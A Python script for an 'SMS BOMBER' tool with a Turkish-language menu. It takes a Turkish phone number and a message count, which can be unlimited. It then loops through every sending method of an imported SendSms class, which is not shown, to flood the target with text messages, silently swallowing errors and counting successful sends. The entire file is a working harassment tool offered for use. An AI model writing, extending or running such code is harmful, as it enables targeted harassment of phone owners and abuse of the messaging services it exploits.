from colorama import init, Fore, Style
from time import sleep
import os
from os import system
from sms import SendSms
from tqdm import tqdm

init(autoreset=True)

def clear():
    system("cls" if os.name == "nt" else "clear")

def banner():
    clear()
    print(f"""{Fore.CYAN}
╔════════════════════════════════════════════════════════════╗
║                  SMS BOMBER                               ║
║               Sadece Başarılı Gönderimler Gösteriliyor    ║
╚════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
""")

def get_phone():
    banner()
    print(f"{Fore.WHITE}📱 Telefon Numarası (+90 olmadan haneli):{Style.RESET_ALL}")
    while True:
        try:
            num = input(f"{Fore.GREEN}> {Style.RESET_ALL}").strip()
            if len(num) == 10 and num.isdigit():
                return num
            print(f"{Fore.RED} 10 haneli rakam girin!{Style.RESET_ALL}")
        except:
            pass

def get_count():
    print(f"{Fore.WHITE} Kaç SMS? (Boş = Sonsuz):{Style.RESET_ALL}")
    val = input(f"{Fore.GREEN}> {Style.RESET_ALL}").strip()
    return None if val == "" else int(val)

def main():
    while True:
        banner()
        print(f"{Fore.YELLOW}1 → Başlat")
        print(f"2 → Çıkış{Style.RESET_ALL}\n")
        secim = input(f"{Fore.CYAN}Seçim > {Style.RESET_ALL}")

        if secim == "2":
            banner()
            print(f"{Fore.RED}Çıkılıyor...{Style.RESET_ALL}")
            sleep(1)
            break
        if secim != "1":
            continue

        phone = get_phone()
        count = get_count()

        banner()
        print(f"{Fore.MAGENTA}Hedef: +90{phone}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}SMS Limiti: {'Sonsuz' if not count else count}{Style.RESET_ALL}\n")

        sms = SendSms(phone, "")
        sent = 0
        target = count if count else float('inf')

        with tqdm(total=target if count else None, desc="Progress", unit="sms", 
                  bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} {elapsed}") as pbar:

            while sent < target:
                for method in [m for m in dir(SendSms) if callable(getattr(SendSms, m)) and not m.startswith("__")]:
                    if sent >= target:
                        break
                    try:
                        if getattr(sms, method)():          # Başarılıysa True döner
                            sent += 1
                            pbar.update(1)
                            print(f"{Fore.LIGHTGREEN_EX}✅ {method}{Style.RESET_ALL}")
                    except:
                        pass                                # Başarısız sessiz
                    sleep(0.8)

        banner()
        print(f"{Fore.LIGHTGREEN_EX}✅ Tamamlandı! Toplam Başarılı: {sent}{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Devam etmek için Enter...{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
